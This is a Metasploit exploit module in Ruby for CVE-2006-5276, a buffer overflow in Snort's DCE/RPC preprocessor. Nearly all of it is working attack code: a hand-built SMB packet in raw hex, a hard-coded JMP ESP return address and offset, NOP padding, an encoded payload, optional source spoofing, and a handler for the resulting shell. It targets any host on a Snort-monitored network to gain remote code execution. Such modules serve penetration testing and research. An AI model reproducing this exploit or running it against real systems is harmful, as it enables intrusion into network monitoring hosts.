##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Capture
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Snort 2 DCE/RPC preprocessor Buffer Overflow',
			'Description'     => %q{
					This module allows remote attackers to execute arbitrary code by exploiting the
				Snort service via crafted SMB traffic. The vulnerability is due to a boundary
				error within the DCE/RPC preprocessor when reassembling SMB Write AndX requests,
				which may result a stack-based buffer overflow with a specially crafted packet
				sent on a network that is monitored by Snort.

				Vulnerable versions include Snort 2.6.1, 2.7 Beta 1 and SourceFire IDS 4.1, 4.5 and 4.6.

				Any host on the Snort network may be used as the remote host. The remote host does not
				need to be running the SMB service for the exploit to be successful.
			},
			'Author'          =>
				[
					'Neel Mehta', #Original discovery (IBM X-Force)
					'Carsten Maartmann-Moe <carsten[at]carmaa.com>'  #Metasploit
				],
			'License'         => MSF_LICENSE,
			'Platform'        => 'win',
			'References'      =>
				[
					[ 'OSVDB', '67988' ],
					[ 'CVE', '2006-5276' ],
					[ 'URL', 'http://downloads.securityfocus.com/vulnerabilities/exploits/22616-linux.py']
				],
			'DefaultOptions'  =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'         =>
				{
					'Space'         => 390,
					'BadChars'      => "\x00",
					'DisableNops'   => true,
				},
			'Targets'         =>
				[
					[
						'Windows Universal',
						{
							'Ret'    => 0x00407c01,  # JMP ESP snort.exe
							'Offset' => 289          # The number of bytes before overwrite
						}
					],
				],
			'Privileged'      => true,
			'DisclosureDate'  => 'Feb 19 2007',
			'DefaultTarget'   => 0))

		register_options(
			[
				Opt::RPORT(139),
				OptAddress.new('RHOST', [ true,  'A host on the Snort-monitored network' ]),
				OptAddress.new('SHOST', [ false, 'The (potentially spoofed) source address'])
			], self.class)

		deregister_options('FILTER','PCAPFILE','SNAPLEN','TIMEOUT')
	end

	def exploit
		open_pcap

		shost = datastore['SHOST'] || Rex::Socket.source_address(rhost)

		p = buildpacket(shost, rhost, rport.to_i)

		print_status("Sending crafted SMB packet from #{shost} to #{rhost}:#{rport}...")

		capture_sendto(p, rhost)

		handler
	end

	def buildpacket(shost, rhost, rport)
		p = PacketFu::TCPPacket.new
		p.ip_saddr = shost
		p.ip_daddr = rhost
		p.tcp_dport = rport
		p.tcp_flags.psh = 1
		p.tcp_flags.ack = 1

		# SMB packet borrowed from http://exploit-db.com/exploits/3362

		# NetBIOS Session Service, value is the number of bytes in the TCP segment,
		# must be greater than the total size of the payload. Statically set.
		header = "\x00\x00\xde\xad"

		# SMB Header
		header << "\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8\x00\x00"
		header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
		header << "\x00\x08\x30\x00"

		# Tree Connect AndX Request
		header << "\x04\xa2\x00\x52\x00\x08\x00\x01\x00\x27\x00\x00"
		header << "\x5c\x00\x5c\x00\x49\x00\x4e\x00\x53\x00\x2d\x00\x4b\x00\x49\x00"
		header << "\x52\x00\x41\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00"
		header << "\x3f\x3f\x3f\x3f\x3f\x00"

		# NT Create AndX Request
		header << "\x18\x2f\x00\x96\x00\x00\x0e\x00\x16\x00\x00\x00\x00\x00\x00\x00"
		header << "\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		header << "\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x40\x00\x02\x00\x00\x00"
		header << "\x01\x11\x00\x00\x5c\x00\x73\x00\x72\x00\x76\x00\x73\x00\x76\x00"
		header << "\x63\x00\x00\x00"

		# Write AndX Request #1
		header << "\x0e\x2f\x00\xfe\x00\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80"
		header << "\x00\x48\x00\x00\x00\x48\x00\xb6\x00\x00\x00\x00\x00\x49\x00\xee"
		header << "\x05\x00\x0b\x03\x10\x00\x00\x00\xff\x01\x00\x00\x01\x00\x00\x00"
		header << "\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
		header << "\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88"
		header << "\x03\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
		header << "\x2b\x10\x48\x60\x02\x00\x00\x00"

		# Write AndX Request #2
		header << "\x0e\xff\x00\xde\xde\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80"
		header << "\x00\x48\x00\x00\x00\xff\x01"

		tail = "\x00\x00\x00\x00\x49\x00\xee"

		# Return address
		eip =  [target['Ret']].pack('V')

		# Sploit
		sploit = make_nops(10)
		sploit << payload.encoded

		# Padding (to pass size check)
		sploit << make_nops(1)

		# The size to be included in Write AndX Request #2, including sploit payload
		requestsize = [(sploit.size() + target['Offset'])].pack('v')

		# Assemble the parts into one package
		p.payload = header << requestsize << tail << eip << sploit
		p.recalc

		p
	end
end